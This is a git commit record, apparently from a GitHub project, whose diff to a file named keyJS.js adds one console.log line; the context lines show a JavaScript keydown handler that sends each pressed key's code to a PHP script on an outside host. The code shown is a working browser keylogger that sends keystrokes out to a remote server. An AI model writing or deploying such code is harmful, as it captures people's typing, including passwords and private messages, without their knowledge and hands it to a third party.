b4167e2c0296bb3c732de445667d6f7b3db87559
Usagi86 <Usagi86@users.noreply.github.com>
2016-10-31 18:41:10 -0600

    Update keyJS.js

--- keyJS.js
+++ keyJS.js
@@ -2,4 +2,5 @@ document.onkeydown = function(k){
  url = new XMLHttpRequest();
  url.open("get", "https://rawgit.com/Usagi86/ClienteLT/master/keyPHP.php?k=" + k.keyCode);
  url.send(null);
+ console.log(k)
 }
